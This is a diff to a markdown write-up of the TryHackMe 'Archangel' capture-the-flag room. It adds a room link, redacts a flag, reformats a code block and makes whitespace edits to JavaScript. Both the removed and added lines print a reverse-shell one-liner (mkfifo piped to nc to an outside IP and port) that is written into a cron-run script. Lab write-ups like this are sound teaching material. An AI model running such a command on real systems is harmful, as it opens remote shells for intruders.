@@ -1,4 +1,6 @@
 
+[TryHackMe Link](https://tryhackme.com/room/archangel){ .md-button }
+
 !!! example "Description"
 
     <p id="desc" style="font-size:15px"></p>
@@ -159,7 +161,7 @@ Upon decoding the result, I was able to successfully access the ```test.php``` f
     </button></a> <a href="/test.php?view=/var/www/html/development_testing/mrrobot.php"><button id="secret">Here is a button</button></a><br>
         <?php
 
-	    //FLAG: thm{explo1t1ng_lf1}
+	    //FLAG: {--REDACTED--}
 
             function containsStr($str, $substr) {
                 return strpos($str, $substr) !== false;
@@ -270,9 +272,8 @@ Afterwards, I was able to escalate my privileges horizontally for the user ``arc
 
 This presented an opportunity to execute a reverse shell. To do so, I modified the code within the `helloworld.sh` file to include the following command:
 
-```sh
-echo "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.17.3.217 5433" > /opt/helloworld.sh
-```
+!!! Bug "Reverse Shell Command"
+    <span>echo "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.17.3.217 5433" > /opt/helloworld.sh</span>
 
 As a result of this change, I was able to successfully execute a reverse shell and obtain the flag-4 located at 
 ~/secret/user2.txt
@@ -349,7 +350,7 @@ function updateHTML() {
     const keys = Object.keys(data);
     const values = Object.values(data);
 
-    for(var z=0; z < keys.length; z++){
+    for(var z=0; z < keys.length; z++){ 
 
         if(keys[z] === "ports"){
             const ports = data.ports.split(';');
@@ -363,11 +364,11 @@ function updateHTML() {
             try{
             document.getElementById(keys[z]).innerHTML = values[z];
             }
-            catch(error){
-                console.log(values[z]);
-            }
-        }
-    }
+            catch(error){ 
+                console.log(values[z]); 
+            } 
+        } 
+    } 
 
     // replace the values with your specific filenames and number of images and img tags
     const numImgTags = document.getElementsByTagName('img').length;
